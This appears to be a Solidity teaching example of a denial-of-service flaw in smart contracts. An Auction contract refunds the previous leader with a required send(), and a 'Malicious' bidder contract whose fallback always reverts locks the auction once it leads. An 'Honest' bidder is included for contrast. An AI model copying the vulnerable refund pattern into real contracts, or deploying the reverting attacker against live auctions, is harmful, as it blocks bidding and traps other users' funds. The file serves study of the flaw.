pragma solidity ^0.4.17;
contract Auction {
    address public currentLeader;
    uint public highestBid;

    function bid() public payable {
        require(msg.value > highestBid);

        require(currentLeader.send(highestBid));

        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}

contract Honest {
    Auction auc;
    event LogAmountDeposit(uint payAmt);

    function addMoney() public payable {}

    function () public payable {
        LogAmountDeposit(msg.value);
    }

    function Honest(address a) public {
        auc = Auction(a);
    }

    function myBid(uint bidVal) public {
        auc.bid.value(bidVal)();
    }

    function getBalance() public view returns (uint) {
        return this.balance;
    }
}

contract Malicious {
    Auction auc;

    function addMoney() public payable {}

    function () public payable {
        revert();
    }

    function Malicious(address a) public {
        auc = Auction(a);
    }

    function myBid(uint bidVal) public {
        auc.bid.value(bidVal)();
    }

    function getBalance() public view returns (uint) {
        return this.balance;
    }
}
